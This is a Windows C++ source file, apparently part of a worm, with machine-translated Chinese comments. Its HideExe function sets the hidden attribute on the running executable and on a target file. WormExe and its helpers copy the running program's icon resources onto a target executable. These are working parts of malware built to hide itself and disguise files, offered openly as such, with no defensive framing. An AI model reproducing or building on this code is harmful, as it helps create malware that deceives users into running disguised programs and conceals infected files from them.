#include "stdafx.h"
#include "Global.h"

BOOL HideExe(
    LPCSTR szExePath    // EXE path
)
{
    // Hide oneself
    TCHAR exeFullPath[MAX_PATH];                            // MAX_PATHÔÚWINDEF.h Defined in the, equal to 260
    memset(exeFullPath, 0, MAX_PATH);
    GetModuleFileName(NULL, exeFullPath, MAX_PATH);
    SetFileAttributes(exeFullPath, FILE_ATTRIBUTE_HIDDEN);
    // Hide the other
    SetFileAttributes(szExePath, FILE_ATTRIBUTE_HIDDEN);
    // SetFileAttributes(szExePath, FILE_ATTRIBUTE_READONLY);  // FILE_ATTRIBUTE_READONLY |
    return TRUE;
}

// char A character 52 +  256 A byte£¬Two bytes 65536 character

void WormExe(
    char* szObjExePath  // The path of the target object
)
{
    // Get the current path of my executable file to get the icon
    char szCurrentExePath[MAX_PATH];        // Defines an array of characters
    memset(szCurrentExePath, 0, MAX_PATH);  // Clear the road here
    // Get the road king
    GetModuleFileName(
        NULL,               // Module (Executable, DLL) handle   Gets the path to the executable file of the current Executable, directly with NUL
        szCurrentExePath,   // The buffer that stores the block
        MAX_PATH            // Buffer size
    );
    // Change Icon
    SetExeIcon(szCurrentExePath, szObjExePath);
}

int SetExeIcon(LPSTR szCurrentExePath,      // Current file path
               LPSTR szObjExePath)
{
    // Load the EXE specified module into the process address space
    HMODULE hExe = LoadLibrary(szCurrentExePath);   // Get the module

    if(hExe == NULL) return 1;

    // Enumerate traversal to get resources
    EnumResourceNames(hExe,                             // The module handle to find
                      RT_ICON,                          // The type of resource to be enumerated
                      (ENUMRESNAMEPROC)EnumIconProc,    // Enumeration resource name callback function
                      (LONG)szObjExePath);              // The parameter values passed to the callback function
    FreeLibrary(hExe);                                  // The release of the module
    return 1;
}

BOOL CALLBACK EnumIconProc(HMODULE hModule,     // The module handle (which is the handle to the executable)
                           LPCTSTR lpszType,    // Resource type
                           LPTSTR  lpszName,    // The icon name
                           LONG    lpParam)     // Incoming parameter
{
    // To find the resources
    HRSRC hRes =                        // A handle to the resource type
        FindResource(hModule,           // The module handle of the executable file
                     lpszName,          // Resource name
                     RT_ICON);          // Resource type

    if(hRes == NULL)return FALSE;

    // Load resources (load module)
    HGLOBAL hResLoad =          // Global handle
        LoadResource(hModule,   // The module handle of the executable file
                     hRes);     // The resource handle to be loaded
    LPVOID pData = LockResource(hResLoad);                  // Lock the resource (get the pointer to this memory)
    // Gets the size of the specified resource
    DWORD dwSize = SizeofResource(hModule, hRes);           // Get the size of this icon

    // Set the resource icon
    if(lpParam)
    {
        SetRes((LPSTR)lpParam,  // Path
               RT_ICON,        // Model to imitate
               lpszName,       // Resource name
               pData,          // Resources in memory
               dwSize);        // Resource size
    }

    return TRUE;
}

int SetRes(LPSTR  szImageName,  // Path
           LPSTR  szResType,    // Types of resources
           LPSTR  szResName,    // Resource name
           LPVOID pData,        // The memory pointer to this resource
           DWORD  dwSize)       // Resource size
{
    // Update your resources
    HANDLE hExe =                           // Returned handle
        BeginUpdateResource(szImageName,    // Update the name of the resource
                            FALSE);         // Update TRUE deletes

    if(hExe == NULL) return FALSE;

    // Real to update him to add delete replacement
    int nRes =
        UpdateResource(hExe,
                       szResType,                                       // Update the type of the resource
                       szResName,                                       // The name of the resource to be updated
                       MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),       // To update the resource's language identifier
                       pData,                                           // Resources to point to memory resource data
                       dwSize);                                         // Resource size

    if(!nRes) return FALSE;

    EndUpdateResource(hExe, FALSE);     // Submit (modified) resources
    return TRUE;
}

